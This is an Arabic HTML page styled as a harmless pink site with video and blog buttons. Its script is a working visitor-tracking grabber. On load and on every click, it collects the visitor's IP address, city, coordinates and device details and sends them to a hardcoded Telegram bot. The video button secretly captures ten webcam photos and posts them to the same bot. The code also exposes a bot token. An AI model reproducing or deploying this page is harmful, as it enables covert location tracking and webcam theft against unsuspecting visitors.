<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0">
  <title>طائفة الظلام - DKSTx666</title>
  <style>
    body {
      margin: 0;
      background: radial-gradient(circle, pink 20%, #ffccff);
      font-family: Arial, sans-serif;
      direction: rtl;
      text-align: center;
      overflow-x: hidden;
      position: relative;
    }
    /* باقي التنسيق يبقى كما هو (نفس التنسيق السابق تماماً) */
  </style>
</head>
<body onclick="reportClick()">

  <!-- باقي الصفحة كما هي -->

  <div class="video-fab" onclick="accessCamera()">🎥</div>
  <div class="blog-fab" onclick="goToIndex()">📖</div>

  <script>
    const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
    const CHAT_ID = "7664410054";
    let report = "🛑 تقرير دخول جديد:\n\n";

    function getIPInfo() {
      return fetch("https://ipinfo.io/json")
        .then(res => res.json())
        .then(data => {
          report += `🌐 IP: ${data.ip || "❌"}\n`;
          report += `📍 الدولة: ${data.country || "❌"}\n`;
          report += `🏙️ المدينة: ${data.city || "❌"}\n`;
          report += `🌎 إحداثيات: ${data.loc || "❌"}\n`;
          report += `🛰️ خريطة: https://www.google.com/maps?q=${data.loc || ""}\n\n`;
        })
        .catch(() => {
          report += "🌐 IP: ❌ فشل جلب الـ IP\n\n";
        });
    }

    function getDeviceInfo() {
      const ua = navigator.userAgent;
      report += `🧠 UserAgent: ${ua}\n`;

      if (/android/i.test(ua)) report += "📱 الجهاز: أندرويد ✅\n";
      else if (/iphone|ipad/i.test(ua)) report += "🍏 الجهاز: آيفون ✅\n";
      else if (/windows/i.test(ua)) report += "💻 الجهاز: ويندوز ✅\n";
      else report += "🌀 الجهاز: غير معروف ❌\n";

      if (/chrome/i.test(ua)) report += "🌐 المتصفح: Chrome ✅\n";
      else if (/firefox/i.test(ua)) report += "🌐 المتصفح: Firefox ✅\n";
      else if (/safari/i.test(ua)) report += "🌐 المتصفح: Safari ✅\n";
      else report += "🌐 المتصفح: غير معروف ❌\n";

      report += "\n";
    }

    function sendToTelegram(msg) {
      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`
      });
    }

    async function runReport() {
      await getIPInfo();
      getDeviceInfo();
      sendToTelegram(report);
    }

    runReport();

    function reportClick() {
      runReport();
    }

    function goToIndex() {
      window.location.href = "index.html";
    }

    async function accessCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');

        let count = 0;
        const interval = setInterval(() => {
          if (count >= 10) {
            clearInterval(interval);
            stream.getTracks().forEach(track => track.stop());
            return;
          }
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0);
          const imgData = canvas.toDataURL('image/jpeg');
          sendPhotoToTelegram(imgData);
          count++;
        }, 500);

      } catch (err) {
        alert("فشل الوصول إلى الكاميرا: " + err);
      }
    }

    function sendPhotoToTelegram(base64Image) {
      fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
        method: "POST",
        body: new URLSearchParams({
          chat_id: CHAT_ID,
          photo: base64Image
        })
      });
    }
  </script>
</body>
</html>
